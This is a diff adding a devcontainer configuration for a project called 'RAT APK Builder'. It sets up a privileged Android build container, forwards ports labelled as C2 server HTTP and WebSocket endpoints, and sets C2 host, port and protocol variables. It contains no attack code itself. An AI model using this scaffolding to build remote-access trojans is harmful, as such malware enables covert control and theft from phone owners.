@@ -1,0 +1,76 @@
+{
+  "name": "RAT APK Builder",
+  "build": {
+    "dockerfile": "Dockerfile"
+  },
+  "runArgs": [
+    "--cap-add=SYS_ADMIN",
+    "--cap-add=CAP_DAC_OVERRIDE",
+    "--device=/dev/kvm",
+    "--device=/dev/binderfs",
+    "--privileged"
+  ],
+  "customizations": {
+    "vscode": {
+      "extensions": [
+        "google.android",
+        "vscjava.vscode-java-pack",
+        "redhat.vscode-xml",
+        "gradle.gradle-language",
+        "kotlin.kotlin",
+        "ms-python.python",
+        "ms-python.vscode-pylance",
+        "docker.docker",
+        "ms-azuretools.vscode-docker",
+        "github.vscode-github-actions"
+      ],
+      "settings": {
+        "java.configuration.runtimes": [
+          {
+            "name": "JavaSE-17",
+            "path": "/usr/lib/jvm/java-17-openjdk-amd64",
+            "default": true
+          }
+        ],
+        "gradle.nestedProjects": true,
+        "android.sdk.path": "/opt/android-sdk",
+        "terminal.integrated.defaultProfile.linux": "bash"
+      }
+    }
+  },
+  "forwardPorts": [8080, 8081, 5000, 5554, 5555],
+  "portsAttributes": {
+    "8080": {
+      "label": "C2 Server HTTP",
+      "onAutoForward": "notify"
+    },
+    "8081": {
+      "label": "C2 Server WebSocket",
+      "onAutoForward": "notify"
+    },
+    "5000": {
+      "label": "Flask Dev Server",
+      "onAutoForward": "notify"
+    },
+    "5554": {
+      "label": "Android Emulator Console",
+      "onAutoForward": "ignore"
+    },
+    "5555": {
+      "label": "Android Emulator ADB",
+      "onAutoForward": "ignore"
+    }
+  },
+  "postCreateCommand": "bash .devcontainer/setup.sh",
+  "postStartCommand": "bash .devcontainer/start.sh",
+  "remoteUser": "vscode",
+  "containerEnv": {
+    "ANDROID_HOME": "/opt/android-sdk",
+    "ANDROID_SDK_ROOT": "/opt/android-sdk",
+    "JAVA_HOME": "/usr/lib/jvm/java-17-openjdk-amd64",
+    "GRADLE_USER_HOME": "/home/vscode/.gradle",
+    "C2_HOST": "0.0.0.0",
+    "C2_PORT": "8080",
+    "C2_PROTOCOL": "http"
+  }
+}
